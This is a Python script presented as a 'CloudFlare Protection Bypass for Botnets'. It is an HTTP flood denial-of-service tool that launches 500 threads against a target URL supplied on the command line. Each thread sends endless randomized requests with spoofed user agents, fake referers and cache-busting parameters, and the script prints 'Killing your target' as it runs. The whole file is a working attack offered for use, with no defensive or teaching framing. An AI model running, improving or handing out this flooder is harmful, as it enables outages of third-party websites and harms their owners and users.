# -*- coding: utf-8 -*-

#################################################################
#################################################################
##   =====> CFP Bypass - CloudFlare Protection Bypass <=====   ##
##                                                             ##
##               Made by @Mecz1nho from @Pryzraky              ##
##                                                             ##
##                         ~ Follow ~                          ##
##                https://twitter.com/Mecz1nho                 ##
##                https://twitter.com/Pryzraky                 ##
##                                                             ##    
#################################################################
#################################################################

import urllib.request, urllib.error, urllib.parse
import sys
import threading
import random
import re

url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
        global request_counter
        request_counter+=1

def set_flag(val):
        global flag
        flag=val

def set_safe():
        global safe
        safe=1

def useragent_list():
        global headers_useragents
        try:
                with open("user-agents.txt", 'r') as f:
                    for line in f:
                        user_agent = line.strip()
                        if user_agent:
                                headers_useragents.append(user_agent)
        except IOError as e:
            print(f"Error opening file 'user-agents.txt': {e}")
        return(headers_useragents)

def referer_list():
        global headers_referers
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://www.google.com/')
        headers_referers.append('http://www.bing.com/')
        headers_referers.append('http://www.baidu.com/')        
        headers_referers.append('http://www.yandex.com/')
        headers_referers.append('http://www.yahoo.com/')        
        headers_referers.append('http://www.globo.com/')        
        headers_referers.append('http://www.pastebin.com/')
        headers_referers.append('http://www.chris.com/')        
        headers_referers.append('http://www.retrojunkie.com/')
        headers_referers.append('http://www.usatoday.com/')
        headers_referers.append('http://www.engadget.search.aol.com/')
        headers_referers.append('http://www.ask.com/')
        headers_referers.append('http://www.sogou.com/')        
        headers_referers.append('http://www.zhongsou.com/')
        headers_referers.append('http://www.dmoz.org/')
        headers_referers.append('http://' + host + '/')      
        return(headers_referers)

def buildblock(size):
        out_str = ''
        for i in range(0, size):
                a = random.randint(65, 90)
                out_str += chr(a)
        return(out_str)

def usage():
        print ('===> Attack command: cfbypass.py cloudflare.com <===')
        print ("\a")
print \
(""" 
´´´¶¶¶¶´´´´´´´´´´s¶¶¶¶¶´´´´´´´´´´´s¶¶¶
´´´´¶¶¶¶¢´´´´´7¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶
´´´7¶¶¶¶¢´´´¢¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´s¶¶¶¶s
´´¶¶¶¶¶¶¶¶´ø¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1´¶¶¶¶¶¶¶¶
´´¢øs$¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¢¢$$
´´´´´´´´7¢ø¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶s´ø
´´´Made´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
´´´´By´´´´1¶¶¶¶ø´´7¶¶¶¶¶1´ø¶¶¶¶¶s
´Mecz1nho´´¶¶´´´´´´´¶¶¶´´´´´´s¶¶
´´´from´´´1¶¶´´´´´´$¶¶¶1´´´´´´¶¶1
´Pryzraky´´¶¶¶´´s¶¶¶´´ø¶¶s´´¶¶¶¶
´´´´´´´´´´´7¶¶¶¶¶¶¶¶´´´¶¶¶¶¶¶¶¶1
´´´´´´´´´´´´´¶¶¶¶¶¶¶s$s¶¶¶¶¶¶
´´´´´´´´´´´ø¶´¶s¶¶¶¶¶¶¶¶¶¶¶´¶´¶s
´´´´7´´´´$¶¶¶´¶´CF-BYPASS´$´¶¶¶¶¶
´1¶¶¶¶¶¶¶¶¶¶ø´¶´¶¶$¶¶$¶¶$¶7¶1´¶¶¶¶¶¶¶¶¶¶¶
´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶1´´´¶¶¶¶¶¶¶¶¶
´´´ø¶¶¶¶¶´´´´´´1¶¶¶¶¶¶¶¶¶¶¢´´´´´´¶¶¶¶¶¶¶
´´´´´s¶¶ø´´´´´´´´´$¶¶¶¶¶s´´´´´´´´1¶¶¶
""")
print ('===> CF-Bypass - CloudFlare Protection Bypass for Botnets <===')
print ("\a")

        
def httpcall(url):
        useragent_list()
        referer_list()
        code=0
        if url.count("?")>0:
                param_joiner="&"
        else:
                param_joiner="?"
        request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        try:
                        urllib.request.urlopen(request)
        except urllib.error.HTTPError as e:
                        #rint e.code
                        set_flag(1)
                        print('[Mecz1nho CF-BYPASS [Killing your target]')
                        code=500
        except urllib.error.URLError as e:
                        #rint e.reason
                        sys.exit()
        else:
                        inc_counter()
                        urllib.request.urlopen(request)
        return(code)



class HTTPThread(threading.Thread):
        def run(self):
                try:
                        while flag<2:
                                code=httpcall(url)
                                if (code==500) & (safe==1):
                                        set_flag(2)
                except Exception as ex:
                        pass


class MonitorThread(threading.Thread):
        def run(self):
                previous=request_counter
                while flag==0:
                        if (previous+100<request_counter) & (previous!=request_counter):
                                print("%d Requests Sent" % (request_counter))
                                previous=request_counter
                if flag==2:
                        print("\n Script launched")


if len(sys.argv) < 2:
        usage()
        sys.exit()
else:
        if sys.argv[1]=="help":
                usage()
                sys.exit()
        else:
                print('[Mecz1nho CF-BYPASS [Killing your target]')
                if len(sys.argv)== 3:
                        if sys.argv[2]=="safe":
                                set_safe()
                url = sys.argv[1]
                if url.count("/")==2:
                        url = url + "/"
                m = re.search('http\://([^/]*)/?.*', url)
                host = m.group(1)
                for i in range(500):
                        t = HTTPThread()
                        t.start()
                t = MonitorThread()
                t.start()
